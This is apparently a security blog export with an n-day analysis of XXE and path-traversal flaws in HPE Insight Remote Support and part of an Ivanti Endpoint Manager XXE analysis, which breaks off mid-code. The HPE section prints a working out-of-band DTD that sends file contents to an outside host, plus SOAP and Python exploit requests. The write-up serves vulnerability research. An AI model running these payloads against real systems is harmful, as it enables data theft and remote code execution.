[{"content":"","date":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":null,"permalink":"/categories/cve-analysis/","section":"Categories","summary":"","title":"CVE Analysis"},{"content":"","date":null,"permalink":"/tags/cve-2024-53675/","section":"Tags","summary":"","title":"CVE-2024-53675"},{"content":"","date":null,"permalink":"/tags/cve-2024-53676/","section":"Tags","summary":"","title":"CVE-2024-53676"},{"content":"In this post, we’ll delve into two critical vulnerabilities recently discovered in the HPE Insight Remote Support (IRS) application, versions prior to v7.14.0.629. These vulnerabilities—CVE-2024-53675 (unauthenticated XXE vulnerability) and CVE-2024-53676 (Remote Code Execution, or RCE vulnerability)—pose significant security risks, allowing unauthorized access and arbitrary code execution on vulnerable systems.\nOverview #With the holiday vibes going around, I had no plans on releasing any posts but as I was working through this, I learned few things about secure coding practices and hunting for these reported vulnerabilities gives a good practice to understand the researcher\u0026rsquo;s thought process and perhaps perform variant analysis in a similar situation. The Insight Remote Support application by HPE is used to gather information and statistics for multiple other hardwares such as printers and stuff, there are certain servlets exposed through web UI, accessible without authentication allowing exploitation of all the reported vulnerabilities much easier and with no dependency on credentials. A bit of background in regards with the software is that the web server is based on Tomcat server and perhaps you may have guessed by now the backend is developed on Java.\nExploiting XXE in HPE Insight Remote Support (CVE-2024-53675) #Lately for almost all of the vulnerabilities that I tried to do n-day analysis on turned out to be XXE either due to it\u0026rsquo;s straightforwardness or setup issues that only exposes that XXE vulnerable endpoint. This was no different either as I ran into setup issues with this one as well, one thing that no one mentions is how hard it is to actually get applications like this to work if you\u0026rsquo;re going to exploit vulnerabilities to full extent. Enough talk, let\u0026rsquo;s get down to business.\nAs per ZDI Advisory:\nThis vulnerability allows remote attackers to disclose sensitive information on affected installations of Hewlett Packard Enterprise Insight Remote Support. Authentication is not required to exploit this vulnerability. The specific flaw exists within the implementation of the validateAgainstXSD method. Due to the improper restriction of XML External Entity (XXE) references, a crafted document specifying a URI causes the XML parser to access the URI and embed the contents back into the XML document for further processing. An attacker can leverage this vulnerability to disclose files in the context of SYSTEM.\nDeep Dive into XXE Vulnerability in validateAgainstXSD #This vulnerability is mentioned as an unauthenticated XXE vulnerability, the problem stems from validateAgainstXSD , this function belonged to ucacore library which had number of utility funtions, one of them was our target validateAgainstXSD. The deivce registration request (as per WSDL documentation accessible over /DeviceRegistration/DeviceRegistration.svc?wsdl ) expects XML content within identifier parameter, this later gets passed to com.hp.it.sa.helpers.RegisterDeviceHelper.java class having validateDeviceIDsXML which later passses the XML content to validateAgainstXSD.\npublic static String validateDeviceIDsXML(String deviceIDXml) throws Exception { boolean validate = DirectConnectUtil.shouldValidate(XMLDocumentType.DEVICE_IDENTIFIERS); if (!validate) { logger.info(\u0026#34;validateDeviceIDsXML: Not really doing any validation as shouldValidate configuration says so\u0026#34;); return \u0026#34;\u0026#34;; } String EMPTY_XML = \u0026#34;Empty Device Identifiers XML\u0026#34;; if (StringUtils.isEmpty(deviceIDXml)) { if (logger.isDebugEnabled()) { logger.debug(\u0026#34;validateDeviceIDsXML: returning validation result as : ({})\u0026#34;, \u0026#34;Empty Device Identifiers XML\u0026#34;); } return \u0026#34;Empty Device Identifiers XML\u0026#34;; } ByteArrayInputStream xmlStream = new ByteArrayInputStream(deviceIDXml.getBytes()); InputStream xsdSchemaStream = Thread.currentThread().getContextClassLoader().getResourceAsStream(\u0026#34;xsd/device_ids.xsd\u0026#34;); UCAXMLParseErrorhandler validationHanlder = null; try { validationHanlder = XMLValidator.validateAgainstXSD(xsdSchemaStream, xmlStream, new NamespaceFilter(), \u0026#34;xsd\u0026#34;); } catch (SAXException e) { [..snip..] As we can see, the validateAgainstXSD does not have any predefined rules for blocking DTDs and entitites. For the SAXSource there are some rules that has to be defined for restricting loading of DTDs.\npublic static UCAXMLParseErrorhandler validateAgainstXSD(InputStream xsdSchemaStream, InputStream xmlInstanceStream, XMLFilterImpl nameSpaceFilter, String xsdPath) throws Exception { UCAXMLParseErrorhandler xmlParseErrorhandler = new UCAXMLParseErrorhandler(); SchemaFactory factory = SchemaFactory.newInstance(\u0026#34;http://www.w3.org/2001/XMLSchema\u0026#34;); Source schemaFile = new StreamSource(xsdSchemaStream); factory.setResourceResolver(new ResourceResolver(xsdPath)); try { Schema xsdSchema = factory.newSchema(schemaFile); Validator validator = xsdSchema.newValidator(); SAXSource source = new SAXSource(nameSpaceFilter, new InputSource(xmlInstanceStream)); validator.setErrorHandler(xmlParseErrorhandler); validator.validate(source, null); logger.debug(\u0026#34;validateAgainstXSD: xmlParseErrorhandler.isValid = {}\u0026#34;, Boolean.valueOf(xmlParseErrorhandler.isValid)); } catch (SAXException e) { logger.error(\u0026#34;validateAgainstXSD:\u0026#34;, e); throw e; } catch (IOException e) { logger.error(\u0026#34;validateAgainstXSD: \u0026#34;, e); throw e; } return xmlParseErrorhandler; } Exploiting the XXE Vulnerability: Proof of Concept #For the exploitation of this, I hosted a malicious.dtd as it will be an OOB XXE exploit, then we send a crafted payload which will load this hosted DTD which then reads the specified file and send it to our listener. This resulted in retrieval of content from the specified file, unfortunately the underlying library sends only the first line of the file as it is unable to parse the newline characters hence making this overall attack limited in terms of exfiltrating data. Similar case was identified in the Ivanti Avalanche XXE vulnerability which I wrote an exploit for few months back.\nFollowing DTD is used for showcasing the file read via OOB:\n\u0026lt;!ENTITY % file SYSTEM \u0026#34;file:///C:\\users\\Administrator\\Desktop\\hello.txt\u0026#34;\u0026gt; \u0026lt;!ENTITY % eval \u0026#34;\u0026lt;!ENTITY \u0026amp;#x25; exfiltrate SYSTEM \u0026#39;http://192.168.1.17/?content=%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; %eval; %exfiltrate; RegisterDevice request for triggering XXE attack:\n# SOAP envelope using WS-Addressing with correct input/output actions soap_envelope = f\u0026#34;\u0026#34;\u0026#34; \u0026lt;soap12:Envelope xmlns:soap12=\u0026#34;http://www.w3.org/2003/05/soap-envelope\u0026#34; xmlns:wsa=\u0026#34;http://www.w3.org/2005/08/addressing\u0026#34; xmlns:tns=\u0026#34;http://www.hp.com/it/sa/reg/\u0026#34;\u0026gt; \u0026lt;soap12:Header\u0026gt; \u0026lt;wsa:Action\u0026gt;http://www.hp.com/it/sa/reg/Registration/RegisterDevice\u0026lt;/wsa:Action\u0026gt; \u0026lt;wsa:MessageID\u0026gt;urn:uuid:{uuid.uuid4()}\u0026lt;/wsa:MessageID\u0026gt; \u0026lt;wsa:To\u0026gt;https://localhost:7906/DeviceRegistration/DeviceRegistration.svc\u0026lt;/wsa:To\u0026gt; \u0026lt;tns:AuthenticationHeader\u0026gt; \u0026lt;tns:Gdid\u0026gt;exampleGdid\u0026lt;/tns:Gdid\u0026gt; \u0026lt;tns:RegistrationToken\u0026gt;exampleToken\u0026lt;/tns:RegistrationToken\u0026gt; \u0026lt;/tns:AuthenticationHeader\u0026gt; \u0026lt;/soap12:Header\u0026gt; \u0026lt;soap12:Body\u0026gt; \u0026lt;tns:RegisterDevice\u0026gt; \u0026lt;tns:identifiers\u0026gt; \u0026lt;![CDATA[ \u0026lt;!DOCTYPE a SYSTEM \u0026#34;{collaborator_url}/malicious.dtd\u0026#34;\u0026gt; \u0026lt;a\u0026gt;\u0026amp;callhome;\u0026lt;/a\u0026gt; ]]\u0026gt; \u0026lt;/tns:identifiers\u0026gt; \u0026lt;tns:userId\u0026gt;user123\u0026lt;/tns:userId\u0026gt; \u0026lt;tns:password\u0026gt;password123\u0026lt;/tns:password\u0026gt; \u0026lt;tns:locale\u0026gt;en-US\u0026lt;/tns:locale\u0026gt; \u0026lt;tns:optIn\u0026gt;true\u0026lt;/tns:optIn\u0026gt; \u0026lt;/tns:RegisterDevice\u0026gt; \u0026lt;/soap12:Body\u0026gt; \u0026lt;/soap12:Envelope\u0026gt; \u0026#34;\u0026#34;\u0026#34; Full POC can be found here.\nExploiting Remote Code Execution in HPE IRS (CVE-2024-53676) # This vulnerability allows remote attackers to execute arbitrary code on affected installations of Hewlett Packard Enterprise Insight Remote Support. Authentication is not required to exploit this vulnerability. The specific flaw exists within the implementation of the processAtatchmentDataStream method. The issue results from the lack of proper validation of a user-supplied path prior to using it in file operations. An attacker can leverage this vulnerability to execute code in the context of SYSTEM.\nUnderstanding the RCE Vulnerability in processAtatchmentDataStream #The description is self-explanatory and if you have ever had the chance to look at a vulnerable code handling file upload written in Java, you can spot it under a minute. Connecting the sink attachment to the source was not hard, as we already had an idea of the exposed endpoints accepting requests. The com.hp.it.sa.helpers.DataPackageReceiverWebSvcHelper.java, this source file had a method name processRequestForAttachment which performed several check and later calls processAttachments from attachmentsHelper class.\n/* */ } /* */ /* 227 */ AttachmentsHelper attachmentsHelper = new AttachmentsHelper(adpHolder[0]); /* 228 */ processRequestResponse = attachmentsHelper.processAttachments(dataPackageSubmissionRequest); /* 229 */ if (chd[0] != null \u0026amp;\u0026amp; adpHolder[0] != null) { /* */ /* 231 */ (chd[0]).fileSize = (adpHolder[0]).attachmentSize; /* 232 */ (chd[0]).fileName = (adpHolder[0]).attachmentName; /* */ /* 234 */ logger.debug(\u0026#34;set collectionHistory file name \u0026#39;{}\u0026#39; and size {}\u0026#34;, Long.valueOf((adpHolder[0]).attachmentSize)); /* */ } /* */ /* 237 */ if (!adpHolder[0].changeAdpStateAndPersistInDB(CollectionStateType.NEW)) /* */ { /* 239 */ logger.warn(\u0026#34;Could not change ADP state to NEW\u0026#34;); /* */ } /* */ /* 242 */ return processRequestResponse; /* */ } The processAtatchmentDataStream function processes the attached file sent via the request and specifies the destination directory where to save the file but the problem occurs at the attachmentName handling, since there is no check for characters for traversal i.e. ., .., / , this will in turn if something like ../../ is specified, it will allow the attacker to set the attachmentFileLocation as an entirely different directory eventually saving the specified file to that destination. From a broader perspecitve, as we are aware of the techstack being Java, this will allow us to upload a crafted JSP to the web server directory and performing the RCE. Unfortunately, the instance I had could not be registered for some reason limiting my tests for performing full exploitation.\nprivate void processAtatchmentDataStream(AttachmentPart attachment) throws IOException, SOAPException { String attachmentName = attachment.getContentId(); logger.debug(\u0026#34; processAtatchmentDataStream: Next attachment name = {}\u0026#34;, attachmentName); DataHandler content = attachment.getDataHandler(); */ try { InputStream inputStream = new BufferedInputStream(content.getInputStream(), 8000); String attachmentFileDirectory = DirectConnectUtil.attachmentFileDirectory(); attachmentFileDirectory = StringUtils.isBlank(attachmentFileDirectory) ? FileUtils.createTempDirectory(\u0026#34;dprAttachments\u0026#34;).getAbsolutePath() : attachmentFileDirectory; String attachmentFileLocation = attachmentFileDirectory + File.separatorChar + attachmentName.substring(1, attachmentName.length() - 1); File file = new File(attachmentFileLocation); file.createNewFile(); OutputStream output = new BufferedOutputStream(new FileOutputStream(file)); content.writeTo(output); output.close(); inputStream.close(); logger.debug(\u0026#34; processAtatchmentDataStream: saved attachment at attachmentFileLocation = \u0026#34; + attachmentFileLocation + \u0026#34; with size = \u0026#34; + file .length()); } catch (Exception e) { throw new WebServiceException(e); } } Theoretical Exploitation: Setup Issues Preventing Full RCE #With this information in hand, crafting a request was not a problem as the WSDL(https://localhost:7906/DataPackageReceiver/DataPackageReceiverService.svc?wsdl) gives the information about the parameters and the expected data within them. Utilizing it, the following script crafts the SOAP request that contains some required parameters, this is based on the script we used for XXE attack in the previous one.\nimport base64 import requests import uuid # SOAP endpoint url = \u0026#34;https://localhost:7906/DataPackageReceiver/DataPackageReceiverService.svc\u0026#34; # The file to send (hello.txt) file_path = \u0026#34;hello.txt\u0026#34; # Create the content of the file (hello.txt) with open(file_path, \u0026#34;w\u0026#34;) as file: file.write(\u0026#34;pwned\u0026#34;) # Read the file and encode it in Base64 with open(file_path, \u0026#34;rb\u0026#34;) as file: file_content = file.read() encoded_file_content = base64.b64encode(file_content).decode(\u0026#39;utf-8\u0026#39;) encoded_attachment_content = base64.b64encode(b\u0026#34;pwning\u0026#34;).decode(\u0026#39;utf-8\u0026#39;) # Construct the SOAP XML body with xmlDocument and attachments message_id = f\u0026#34;{uuid.uuid4()}\u0026#34; # Generates a new UUID relates_to_id = f\u0026#34;{uuid.uuid4()}\u0026#34; # Use your specific RelatesTo UUID gdid = guid = uuid.uuid4() registration_token = \u0026#34;a\u0026#34;*32 xml_body = f\u0026#34;\u0026#34;\u0026#34; \u0026lt;S:Envelope xmlns:S=\u0026#34;http://www.w3.org/2003/05/soap-envelope\u0026#34; xmlns:web=\u0026#34;http://www.hp.com/it/sa/dpra/\u0026#34; xmlns:ns1=\u0026#34;http://www.w3.org/2005/08/addressing\u0026#34;\u0026gt; \u0026lt;S:Header\u0026gt; \u0026lt;ns1:Action\u0026gt;http://www.hp.com/it/sa/dpra/DataPackageReceiverService/DataPackageReceiver\u0026lt;/ns1:Action\u0026gt; \u0026lt;ns1:MessageID\u0026gt;{message_id}\u0026lt;/ns1:MessageID\u0026gt; \u0026lt;ns1:RelatesTo\u0026gt;{relates_to_id}\u0026lt;/ns1:RelatesTo\u0026gt; \u0026lt;ns1:ReplyTo\u0026gt; \u0026lt;ns1:Address\u0026gt;http://www.w3.org/2005/08/addressing/anonymous\u0026lt;/ns1:Address\u0026gt; \u0026lt;/ns1:ReplyTo\u0026gt; \u0026lt;!-- SOAP Headers --\u0026gt; \u0026lt;web:gdid\u0026gt;{gdid}\u0026lt;/web:gdid\u0026gt; \u0026lt;web:guid\u0026gt;674a151e-72c3-4747-bf8d-9a4647ff8883\u0026lt;/web:guid\u0026gt; \u0026lt;web:registrationToken\u0026gt;{registration_token}\u0026lt;/web:registrationToken\u0026gt; \u0026lt;/S:Header\u0026gt; \u0026lt;S:Body\u0026gt; \u0026lt;web:DataPackageSubmissionRequest\u0026gt; \u0026lt;web:xmlDocument\u0026gt; \u0026lt;![CDATA[\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;root\u0026gt; \u0026lt;element\u0026gt;Sample XML Data\u0026lt;/element\u0026gt; \u0026lt;/root\u0026gt;]]\u0026gt; \u0026lt;/web:xmlDocument\u0026gt; \u0026lt;web:attachments\u0026gt; \u0026lt;web:ArrayOfAttachment\u0026gt; \u0026lt;web:Attachment\u0026gt; \u0026lt;web:FileName\u0026gt;example.pdf\u0026lt;/web:FileName\u0026gt; \u0026lt;web:FileContent\u0026gt;cm9iaW4=\u0026lt;/web:FileContent\u0026gt; \u0026lt;!-- Base64 encoded content --\u0026gt; \u0026lt;/web:Attachment\u0026gt; \u0026lt;/web:ArrayOfAttachment\u0026gt; \u0026lt;/web:attachments\u0026gt; \u0026lt;/web:DataPackageSubmissionRequest\u0026gt; \u0026lt;/S:Body\u0026gt; \u0026lt;/S:Envelope\u0026gt; \u0026#34;\u0026#34;\u0026#34; print(xml_body) # Set the headers for the SOAP request headers = { \u0026#34;Content-Type\u0026#34;: \u0026#34;application/soap+xml;charset=UTF-8\u0026#34;, # SOAP 1.2 content type } # Send the request response = requests.post(url, data=xml_body, headers=headers, verify=False) # Print the response print(\u0026#34;Response Status Code:\u0026#34;, response.status_code) print(\u0026#34;Response Text:\u0026#34;, response.text) Unfortunately, which as we saw it coming suggests that oosId is not found, oosID here refers to the device ID assigned during the registration, if this ID is not found within the registred instance it will not process the request further and invokes the error hence not even processing the attachment sent via the request.\ntagsResponse Text: \u0026lt;?xml version=\u0026#39;1.0\u0026#39; encoding=\u0026#39;UTF-8\u0026#39;?\u0026gt;\u0026lt;S:Envelope xmlns:S=\u0026#34;http://www.w3.org/2003/05/soap-envelope\u0026#34;\u0026gt;\u0026lt;S:Header\u0026gt;\u0026lt;To xmlns=\u0026#34;http://www.w3.org/2005/08/addressing\u0026#34;\u0026gt;http://www.w3.org/2005/08/addressing/anonymous\u0026lt;/To\u0026gt;\u0026lt;Action xmlns=\u0026#34;http://www.w3.org/2005/08/addressing\u0026#34; xmlns:S=\u0026#34;http://www.w3.org/2003/05/soap-envelope\u0026#34; S:mustUnderstand=\u0026#34;true\u0026#34;\u0026gt;http://www.hp.com/it/sa/dpra/DataPackageReceiverService/DataPackageReceiverResponse\u0026lt;/Action\u0026gt;\u0026lt;MessageID xmlns=\u0026#34;http://www.w3.org/2005/08/addressing\u0026#34;\u0026gt;uuid:765bc242-3452-446c-8c0f-7107086e59ec\u0026lt;/MessageID\u0026gt;\u0026lt;RelatesTo xmlns=\u0026#34;http://www.w3.org/2005/08/addressing\u0026#34;\u0026gt;dc305c5e-c0fb-4bbf-8d92-6ddd8b6bf7ad\u0026lt;/RelatesTo\u0026gt;\u0026lt;/S:Header\u0026gt;\u0026lt;S:Body\u0026gt;\u0026lt;DataPackageSubmissionResponse xmlns=\u0026#34;http://www.hp.com/it/sa/dpra/\u0026#34; xmlns:ns2=\u0026#34;http://www.hp.com/it/sa/dpra\u0026#34; xmlns:ns3=\u0026#34;http://schemas.microsoft.com/2003/10/Serialization/\u0026#34;\u0026gt;\u0026lt;Status\u0026gt;SenderError\u0026lt;/Status\u0026gt;\u0026lt;ErrorCode\u0026gt;206\u0026lt;/ErrorCode\u0026gt;\u0026lt;Message\u0026gt;This device (with oosId: e0cc510d-9100-4b24-9f16-bbb13b004463) is not found in Insight Remote Support. Please unregister and re-register device.\u0026lt;/Message\u0026gt;\u0026lt;/DataPackageSubmissionResponse\u0026gt;\u0026lt;/S:Body\u0026gt;\u0026lt;/S:Envelope\u0026gt; Checking the logs, we observe that the same messaged was logged into the file and there is an additional information stating that the attachment processing was aborted by the application.\n17 Dec 2024 20:02:50.343 [qtp1418385211-34] INFO c.h.i.s.h.DataPackageReceiverWebSvcHelper - Found attachment: ({http://www.hp.com/it/sa/dpra/}xmlDocument) 17 Dec 2024 20:02:50.343 [qtp1418385211-34] WARN c.h.i.s.h.DataPackageReceiverWebSvcHelper - Unknown device. Could not find an IpAddress in the xmlString 17 Dec 2024 20:02:50.343 [qtp1418385211-34] ERROR c.h.i.s.h.DataPackageReceiverWebSvcHelper - processRequest: This device (with oosId: 93f6702d-6ba5-406c-9e81-c9959f141e39) is not found in Insight Remote Support. Please unregister and re-register device. 17 Dec 2024 20:02:50.343 [qtp1418385211-34] ERROR c.h.i.s.h.DataPackageReceiverWebSvcHelper - processRequestForAttachment: aborted processing due to some error in inline XML processing: (javax.xml.bind.JAXBElement@49919d89) 17 Dec 2024 20:02:50.343 [qtp1418385211-34] ERROR c.h.i.s.d.DataPackageReceiverServiceImpl - dataPackageReceiver: non-success status : SENDER_ERROR 17 Dec 2024 20:02:52.711 [RGMgr-1] INFO c.h.u.i.a.hp.remotesupport.HpAdapter - [RGMgr-1] Triggered for self-registration. Checking the function which was handling the attachments, it does not perform the processing.\n/* 206 */ DataPackageXmlSubmissionResponse processRequestXmlResponse = processRequest(xmlString, oosId, iLoMsgId, registrationToken, adpHolder, chd, true); /* */ /* 208 */ processRequestResponse = DirectConnectUtil.convertToDataPackageSubmissionResponse(processRequestXmlResponse); /* */ /* 210 */ if (!processRequestResponse.getStatus().equals(DataPackageResultStatus.SUCCESS)) { /* */ /* 212 */ logger.error(\u0026#34;processRequestForAttachment: aborted processing due to some error in inline XML processing: ({})\u0026#34;, processRequestResponse /* */ /* 214 */ .getMessage()); /* 215 */ return processRequestResponse; /* */ } /* */ Based on our analysis of this vulnerability, it’s clear that exploiting it requires the gdid (oosId) and a registration token, which limits the potential for a fully unauthenticated attack. While the exploitation process itself is straightforward, the need for these specific values introduces some dependency. I’ve uploaded the PoCs to GitHub, and from the analysis conducted, a theoretical exploit with hardcoded values can certainly trigger this path traversal vulnerability. Once the necessary items are obtained, anyone assessing this vulnerability should be able to fully exploit it, leveraging RCE via path traversal.\n","date":"8 January 2025","permalink":"/posts/hpe-irs-cve-deep-dive/","section":"Posts","summary":"In this post, we’ll delve into two critical vulnerabilities recently discovered in the HPE Insight Remote Support (IRS) application, versions prior to v7.14.0.629. These vulnerabilities—CVE-2024-53675 (unauthenticated XXE vulnerability) and CVE-2024-53676 (Remote Code Execution, or RCE vulnerability)—pose significant security risks, allowing unauthorized access and arbitrary code execution on vulnerable systems.","title":"Exploring Recent CVEs in HPE Insight Remote Support"},{"content":"","date":null,"permalink":"/tags/java/","section":"Tags","summary":"","title":"Java"},{"content":"","date":null,"permalink":"/tags/path-traversal/","section":"Tags","summary":"","title":"Path Traversal"},{"content":"","date":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts"},{"content":"","date":null,"permalink":"/","section":"PwnFuzz","summary":"","title":"PwnFuzz"},{"content":"","date":null,"permalink":"/tags/rce/","section":"Tags","summary":"","title":"RCE"},{"content":"","date":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"","date":null,"permalink":"/tags/xxe/","section":"Tags","summary":"","title":"XXE"},{"content":"","date":null,"permalink":"/tags/.net/","section":"Tags","summary":"","title":".NET"},{"content":"This blog provides an in-depth analysis of the exploitation process for an unauthenticated XXE vulnerability in Ivanti Endpoint Manager, identified as CVE-2024-37397.\nUncovering the ImportXml Vulnerability # This vulnerability was identified by 06fe5fd2bc53027c4a3b7e395af0b850e7b8a044 and detailed in the ZDI advisory, which provided key information about the affected component. The advisory mentioned that the XXE vulnerability was found in the ImportXml function, guiding us to search for references to this specific function.\nI was able to get an evaluation copy of the Endpoint Manager using Wayback Machine, from there setup was as easy as following the prompts.\nOnce the installation was complete, I used ripgrep tool to look for any references for ImportXml within the installed directory. Multiple instances were found in following DLLs:\nFortunately, these DLLs are .NET executables, we can load it into the dnSpy and start analyzing right way. Once loaded, we can see that there are multiple classes where importXml is defined and used.\nOne thing that is common in all of the ImportXml functions defined everywhere is that none of them explictly make the XmlResolver as null which is a workaround for XXE vulnerabilities in .NET applications. Given that we now know which DLL has the definition for our vulnerable function, it is now time to look into which function actually calls for this function so we can trigger this for our gain.\nTriggering the Vulnerability: Understanding the Flaw #Initially, when running rg again, there were no other DLLs where ImportXml was called. This indicated that we might be looking for a pattern where a function from the identified DLL calls ImportXml, and that function is called elsewhere. Running rg in this case would be time-consuming and might not yield concrete results, so we needed to move forward by understanding the different components of the application, or alternatively, by considering the paths of the identified DLLs.\nOne place where the [] DLL was found was under ProvisioningWebService. Given its name, this most likely suggests that a web service is being handled by the DLLs in this directory. Upon further investigation, we identified the following DLLs:\nThere is a ProvisioningWebService.dll, which looks promising. Loading it into dnSpy, we can see that the DLL has a class ProvisioningService which has multiple methods defined:\nChecking these methods has [WebMethod] attributes defined, indicating that these methods handle data from web requests.\nLooking into the imports of this class, we can see that LANDesk.Provisioning.Business DLL is called, given that we might be on right track of finding the source/sink pattern of our vulnerability.\nusing LANDesk.Provisioning.Business; As we observed earlier, there were no reference of ImportXml directly found within any DLL and ProvisioningService class was no different but we see that there are some methods that were defined within the LANDesk.Provisioning.Business are called here such as PHistoryTask or PHistoryEntry. The identified functions were GetProvisioningBootOption which was as following:\n[WebMethod] public int GetProvisioningBootOption(string clientMacAddress, string pxeProxyMacAddress, ref int holdingQueuePEtype) { int num = 0; this.log.Log(PRollingLog.logLevel.VERBOSE, \u0026#34;\u0026gt;\u0026gt; GetProvisioningBootOption, clientMacAddress={0}\u0026#34;, new object[] { clientMacAddress }); ServerIdentifier[] sids = new ServerIdentifier[] { ServerIdentifier.getInstance(ServerIdentifierType.MACAddress, clientMacAddress) }; int ldTaskIdn = 0; int[] computerId = TemplateFinder.GetComputerId(sids); if (computerId.Length \u0026lt; 1) { this.log.Log(PRollingLog.logLevel.ERROR, \u0026#34;Unable to find computer with Macaddress {0}\u0026#34;, new object[] { clientMacAddress [..snip..] Certain things that is observable at first is the argument, we see that it takes two different arguments clientMacAddress and other was pxeProxyMacAddress which did not seem like something where we can inject some payload or try, at least from the naked eye. But that\u0026rsquo;s where the other function named SetActionStatus entered in the play. Looking closer into the function we see that it indeed takes an argument of actionXml which seemed promising right off the bat.\n[WebMethod] public ProvisioningService.SetActionStatusRet SetActionStatus(int historyTaskIDN, int historyEntryIDN, int nextHistoryEntryIDN, string actionState, int internalRetval, int externalRetval, string strCapturedText, UserVariable[] Variables, string actionXml) { this.log.Log(PRollingLog.logLevel.VERBOSE, \u0026#34;SetActionStatus (historyTaskIdn {0}, historyEntryIdn {1}, next {2}): state {3}\u0026#34;, new object[] { historyTaskIDN, historyEntryIDN, nextHistoryEntryIDN, actionState }); PError perror = new PError(); bool flag = PHistoryEntry.WriteActionStatus(historyTaskIDN, historyEntryIDN, nextHistoryEntryIDN, actionState, internalRetval, externalRetval, strCapturedText, Variables, actionXml, ref perror); if (flag) { return ProvisioningService.SetActionStatusRet.Ok; } this.log.Log(PRollingLog.logLevel.ERROR, \u0026#34;Unable to set the action status (historyTaskIdn {0}, historyEntryIdn {1}, next {2}): {3}\u0026#34;, new object[] { historyTaskIDN, historyEntryIDN, nextHistoryEntryIDN, perror.Message }); return ProvisioningService.SetActionStatusRet.SetStatusFailed; } Since this is also a [WebMethod] we can be cetain that this particular method can be invoked somehow from the HTTP request. Further analysis of this revealed that it calls PHistoryEntry.WriteActionStatus method which is defined LANDesk.Provisioning.Business DLL. The arguments passed into the WriteActionStatus is something we will take a note of when analyzing the WriteActionStatus class.\nNow, when we check the PHistoryEntry class, we notice that there is a defined method ImportXml as well as our method in question WriteActionStatus. Checking the ImportXml method, we see that it takes the actionXml as string and later processes it via the XmlDocument parser. As we discussed earlier, the XmlResolver value is not set to null meaning that we have can include external DTDs and the parser here will attempt to get the definition from the DTD and perform the processing of the same.\nprotected internal bool ImportXml(string actionXml) { bool flag = true; try { if (flag) { flag = PUser.ValidateProvisioningCreateRight(ref this.err); } XmlDocument xmlDocument = null; XmlNode xmlNode = null; if (flag \u0026amp;\u0026amp; actionXml != null \u0026amp;\u0026amp; actionXml.Length \u0026gt; 0) { xmlDocument = new XmlDocument(); xmlDocument.XmlResolver = null; xmlDocument.LoadXml(actionXml); xmlNode = xmlDocument.SelectSingleNode(\u0026#34;xmlsnippet\u0026#34;); if (xmlNode != null) { xmlNode = xmlNode.FirstChild; } if (xmlNode != null \u0026amp;\u0026amp; xmlNode.Name == \u0026#34;variables\u0026#34;) { xmlNode = xmlNode.NextSibling; But before going there, we need to check how the WriteActionStatus calls our ImportXml and how we can actually trigger our vulnerability. The WriteActionStatus method was defined as follows:\npublic bool WriteActionStatus(int historyTaskIDN, int historyEntryIDN, int nextHistoryEntryIDN, string actionState, int internalRetval, int externalRetval, string strCapturedText, UserVariable[] UserVariables, string actionXml, ref PError err) { PRollingLog prollingLog = new PRollingLog(\u0026#34;PHistoryEntry\u0026#34;); PHistoryTask phistoryTask = null; PHistoryEntry phistoryEntry = null; PHistoryEntry phistoryEntry2 = null; DateTime utcNow = DateTime.UtcNow; HistoryEntryStateType historyEntryStateType = HistoryEntryStateType.UNKNOWN; bool flag = false; bool flag2 = true; if (!flag2) { return false; } try { if (flag2) { phistoryEntry = new PHistoryEntry(historyEntryIDN); phistoryEntry2 = new PHistoryEntry(nextHistoryEntryIDN); phistoryTask = new PHistoryTask(historyTaskIDN); if (!OleDbHelper.IsValidIdnRange(phistoryTask.Id) \u0026amp;\u0026amp; OleDbHelper.IsValidIdnRange(phistoryEntry.Id)) { phistoryTask = new PHistoryTask(phistoryEntry.HistoryTaskId); } if (!OleDbHelper.IsValidIdnRange(phistoryTask.Id) \u0026amp;\u0026amp; OleDbHelper.IsValidIdnRange(phistoryEntry2.Id)) { phistoryTask = new PHistoryTask(phistoryEntry2.HistoryTaskId); } if (OleDbHelper.IsValidIdnRange(historyEntryIDN) \u0026amp;\u0026amp; !OleDbHelper.IsValidIdnRange(phistoryEntry.Id)) { prollingLog.Log(PRollingLog.logLevel.VERBOSE, string.Format(\u0026#34;Unable to write to database. History entry record Idn=\u0026#39;{0}\u0026#39; does not exist.\u0026#34;, historyEntryIDN), Array.Empty\u0026lt;object\u0026gt;()); err = new PError(\u0026#34;L10n.Provisioning.Error.InvalidHistoryEntry\u0026#34;, null, PBL.DEBUGLOC, err); flag2 = false; } if (OleDbHelper.IsValidIdnRange(nextHistoryEntryIDN) \u0026amp;\u0026amp; !OleDbHelper.IsValidIdnRange(phistoryEntry2.Id)) { prollingLog.Log(PRollingLog.logLevel.VERBOSE, string.Format(\u0026#34;Unable to write to database. Next history entry record Idn=\u0026#39;{0}\u0026#39; does not exist.\u0026#34;, nextHistoryEntryIDN), Array.Empty\u0026lt;object\u0026gt;()); err = new PError(\u0026#34;L10n.Provisioning.Error.InvalidHistoryEntry\u0026#34;, null, PBL.DEBUGLOC, err); flag2 = false; } if (!OleDbHelper.IsValidIdnRange(phistoryTask.Id) || (OleDbHelper.IsValidIdnRange(phistoryEntry.Id) \u0026amp;\u0026amp; phistoryTask.Id != phistoryEntry.HistoryTaskId) || (OleDbHelper.IsValidIdnRange(phistoryEntry2.Id) \u0026amp;\u0026amp; phistoryTask.Id != phistoryEntry2.HistoryTaskId)) { prollingLog.Log(PRollingLog.logLevel.VERBOSE, string.Format(\u0026#34;Unable to write to database. Problem with history task record Idn, Declared history task Idn=\u0026#39;{0}\u0026#39;. History entry\u0026#39;s task Idn=\u0026#39;{1}. Next history entry\u0026#39;s task Idn=\u0026#39;{2}\u0026#34;, historyTaskIDN, phistoryEntry.HistoryTaskId, phistoryEntry2.HistoryTaskId), Array.Empty\u0026lt;object\u0026gt;()); err = new PError(\u0026#34;L10n.Provisioning.Error.InvalidHistoryTask\u0026#34;, null, PBL.DEBUGLOC, err); flag2 = false; } } if (flag2 \u0026amp;\u0026amp; phistoryTask.Template == null) { prollingLog.Log(PRollingLog.logLevel.VERBOSE, string.Format(\u0026#34;Unable to write to database. Unable to locate template Idn=\u0026#39;{0}\u0026#39; for history task Idn=\u0026#39;{1}\u0026#39;.\u0026#34;, phistoryTask.TemplateId, phistoryTask.Id), Array.Empty\u0026lt;object\u0026gt;()); err = new 